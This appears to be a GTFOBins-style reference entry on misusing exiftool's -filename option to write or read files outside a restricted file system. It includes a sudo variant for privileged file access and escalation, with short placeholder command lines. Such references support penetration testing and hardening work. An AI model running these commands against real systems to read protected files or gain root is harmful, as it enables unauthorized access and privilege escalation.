# GTFOBin: exiftool

If the permissions allow it, files are moved (instead of copied) to the destination.

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
LFILE=file_to_write
INPUT=input_file
exiftool -filename=$LFILE $INPUT
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
OUTPUT=output_file
exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_write
INPUT=input_file
sudo exiftool -filename=$LFILE $INPUT
```